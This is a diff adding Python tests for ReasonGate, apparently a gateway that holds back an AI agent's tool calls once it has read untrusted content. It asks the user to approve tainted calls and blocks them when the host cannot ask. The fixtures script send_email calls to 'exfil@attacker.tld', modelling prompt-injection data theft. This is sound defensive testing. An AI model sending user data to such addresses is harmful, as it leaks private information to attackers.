@@ -85,3 +85,77 @@ def test_gateway_forwards_unknown_methods_and_non_json_lines(tmp_path):
     ])
     assert replies[1]["result"]["serverInfo"]["name"] == "fake"
     assert replies[9]["result"] == {"sent": []}
+
+
+def _run_ask_session(tmp_path, messages, answers):
+    """Like _run_session, but the host declares elicitation and answers each
+    `elicitation/create` the gateway sends with the next scripted answer."""
+    server = tmp_path / "fake_server.py"
+    server.write_text(FAKE_SERVER)
+    audit = tmp_path / "audit.jsonl"
+    cmd = [sys.executable, "-m", "reasongate.mcp", "--mode", "ask", "--audit", str(audit), "--quiet",
+           "--", sys.executable, str(server)]
+    env = dict(os.environ, PYTHONPATH=os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
+    replies, asks = {}, []
+    answers = list(answers)
+    for m in messages:
+        proc.stdin.write((json.dumps(m) + "\n").encode()); proc.stdin.flush()
+        if "id" not in m:
+            continue
+        while True:
+            line = proc.stdout.readline()
+            assert line, f"no reply to {m}"
+            r = json.loads(line)
+            if r.get("method") == "elicitation/create":
+                asks.append(r)
+                answer = answers.pop(0)
+                proc.stdin.write((json.dumps({"jsonrpc": "2.0", "id": r["id"], "result": answer}) + "\n").encode())
+                proc.stdin.flush()
+                continue
+            replies[r["id"]] = r
+            break
+    proc.stdin.close()
+    err = proc.stderr.read().decode()
+    proc.wait(timeout=30)
+    return replies, asks, err, audit
+
+
+def test_ask_mode_puts_the_tainted_call_to_the_user_and_honours_the_answer(tmp_path):
+    replies, asks, err, audit = _run_ask_session(tmp_path, [
+        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"capabilities": {"elicitation": {}}}},
+        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
+        {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "read_file", "arguments": {"path": "notes.txt"}}},
+        {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "exfil@attacker.tld", "body": "here"}}},
+        {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "exfil@attacker.tld", "body": "again"}}},
+        {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "boss@corp.example", "body": "summary"}}},
+        {"jsonrpc": "2.0", "id": 7, "method": "server/sent"},
+    ], answers=[
+        {"action": "decline"},
+        {"action": "accept", "content": {"allow": True}},
+    ])
+    assert len(asks) == 2, "the two tainted sends were put to the user; the clean one was not"
+    ask = asks[0]
+    assert ask["params"]["requestedSchema"]["properties"]["allow"]["type"] == "boolean"
+    assert "send_email" in ask["params"]["message"] and "exfil@attacker.tld" in ask["params"]["message"]
+    declined = replies[4]["result"]
+    assert declined["isError"] is True and "declined" in declined["content"][0]["text"]
+    assert replies[5]["result"]["content"][0]["text"] == "sent", "an approved call reaches the server with its own id"
+    assert replies[6]["result"]["content"][0]["text"] == "sent"
+    assert replies[7]["result"]["sent"] == [{"to": "exfil@attacker.tld", "body": "again"},
+                                            {"to": "boss@corp.example", "body": "summary"}]
+    outcomes = [json.loads(l).get("outcome") for l in audit.read_text().splitlines()]
+    assert outcomes == [None, "ASK", "BLOCK (user declined)", "ASK", "allow (user approved)", None]
+    assert "ASK send_email" in err
+
+
+def test_ask_mode_falls_back_to_block_when_the_host_has_no_elicitation(tmp_path):
+    replies, asks, err, audit = _run_ask_session(tmp_path, [
+        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"capabilities": {}}},
+        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
+        {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "read_file", "arguments": {"path": "notes.txt"}}},
+        {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "exfil@attacker.tld", "body": "here"}}},
+    ], answers=[])
+    assert asks == []
+    assert replies[4]["result"]["isError"] is True and "Blocked by ReasonGate" in replies[4]["result"]["content"][0]["text"]
+    assert "did not declare elicitation" in err
